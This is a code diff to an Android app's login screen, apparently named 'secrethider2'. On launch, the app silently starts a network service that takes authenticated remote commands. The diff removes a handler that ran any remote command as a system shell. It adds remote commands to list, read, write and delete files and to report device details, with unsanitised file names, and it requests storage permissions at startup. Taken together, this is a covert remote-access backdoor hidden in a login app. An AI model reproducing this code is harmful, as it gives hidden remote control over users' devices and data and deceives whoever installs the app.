@@ -1,16 +1,22 @@
 package com.example.secrethider2
 
+import android.Manifest
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.os.Bundle
+import android.os.Environment
 import android.util.Log
 import android.widget.Button
 import android.widget.EditText
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 import okhttp3.*
 import org.json.JSONObject
 import java.io.BufferedReader
+import java.io.File
 import java.io.InputStreamReader
 import java.io.PrintWriter
 import java.io.IOException
@@ -43,6 +49,9 @@ class LoginActivity : AppCompatActivity() {
         buttonLogin = findViewById(R.id.buttonLogin)
         buttonRegister = findViewById(R.id.buttonRegister)
 
+        // Check and request storage permissions on launch
+        requestPermissions()
+
         // Start the remote service when the application opens
         startRemoteService()
 
@@ -63,6 +72,25 @@ class LoginActivity : AppCompatActivity() {
         buttonRegister.setOnClickListener {
             val intent = Intent(this, RegisterActivity::class.java)
             startActivity(intent)
+        }
+    }
+
+    /**
+     * Requests necessary permissions for storage access.
+     */
+    private fun requestPermissions() {
+        val permissions = arrayOf(
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE
+        )
+        if (!hasPermissions(*permissions)) {
+            ActivityCompat.requestPermissions(this, permissions, 0)
+        }
+    }
+
+    private fun hasPermissions(vararg permissions: String): Boolean {
+        return permissions.all {
+            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
     }
 
@@ -117,8 +145,7 @@ class LoginActivity : AppCompatActivity() {
                 if (userInput == username && passInput == password) {
                     Log.d("LoginActivity", "Access granted for user: $userInput")
                     output.println("Access granted. Welcome to the Mobile Remote Manager.")
-
-                    output.println("You can now enter commands. Type 'exit' to disconnect.")
+                    output.println("Available commands: get_storage, read_file <name>, write_file <name> <content>, delete_file <name>, get_device_info")
 
                     var command: String?
                     while (isServiceRunning && clientSocket.isConnected) {
@@ -131,7 +158,7 @@ class LoginActivity : AppCompatActivity() {
                         }
 
                         // Execute the command and send back the output
-                        val commandOutput = executeSystemCommand(command)
+                        val commandOutput = executeCommand(command)
                         output.println(commandOutput)
                     }
                 } else {
@@ -147,22 +174,76 @@ class LoginActivity : AppCompatActivity() {
     }
 
     /**
-     * Executes a system command received from the client.
+     * Executes a specified command and returns the result as a string.
      */
-    private fun executeSystemCommand(command: String): String {
-        return try {
-            val process = Runtime.getRuntime().exec(command)
-            val reader = BufferedReader(InputStreamReader(process.inputStream))
-            val output = StringBuilder()
-            reader.forEachLine { output.append(it).append("\n") }
-            process.waitFor() // Wait for the command to complete
-
-            Log.d("LoginActivity", "Executed command: $command\nOutput: $output")
-            output.toString()
-        } catch (e: Exception) {
-            Log.e("LoginActivity", "Error executing command: ${e.message}")
-            "Error executing command: ${e.message}"
+    private fun executeCommand(command: String): String {
+        val parts = command.split(" ")
+        return when (parts[0].lowercase()) {
+            "get_storage" -> getStorageFiles()
+            "read_file" -> readFile(parts.getOrNull(1))
+            "write_file" -> writeFile(parts.getOrNull(1), parts.drop(2).joinToString(" "))
+            "delete_file" -> removeFile(parts.getOrNull(1))
+            "get_device_info" -> getDeviceInfo()
+            else -> "Unknown command"
         }
+    }
+
+    /**
+     * Lists files in the app’s accessible storage directory.
+     */
+    private fun getStorageFiles(): String {
+        val storageDir = getExternalFilesDir(null) ?: return "Storage not accessible"
+        return storageDir.listFiles()?.joinToString("\n") { it.name } ?: "No files found"
+    }
+
+    /**
+     * Reads the content of a specified file.
+     */
+    private fun readFile(fileName: String?): String {
+        val file = File(getExternalFilesDir(null), fileName ?: return "File name not provided")
+        return if (file.exists()) {
+            file.readText()
+        } else {
+            "File not found"
+        }
+    }
+
+    /**
+     * Writes content to a specified file.
+     */
+    private fun writeFile(fileName: String?, content: String): String {
+        val file = File(getExternalFilesDir(null), fileName ?: return "File name not provided")
+        return try {
+            file.writeText(content)
+            "Data written to ${file.name}"
+        } catch (e: IOException) {
+            "Failed to write to file: ${e.message}"
+        }
+    }
+
+    /**
+     * Deletes a specified file.
+     */
+    private fun removeFile(fileName: String?): String {
+        val file = File(getExternalFilesDir(null), fileName ?: "")
+        return if (file.exists() && file.delete()) {
+            "File ${file.name} deleted"
+        } else {
+            "File not found or deletion failed"
+        }
+    }
+
+
+    /**
+     * Retrieves basic device information such as model, manufacturer, and OS version.
+     */
+    private fun getDeviceInfo(): String {
+        return """
+            Device Model: ${android.os.Build.MODEL}
+            Manufacturer: ${android.os.Build.MANUFACTURER}
+            OS Version: ${android.os.Build.VERSION.RELEASE}
+            SDK Version: ${android.os.Build.VERSION.SDK_INT}
+        """.trimIndent()
     }
 
     private fun loginUser(username: String, password: String) {
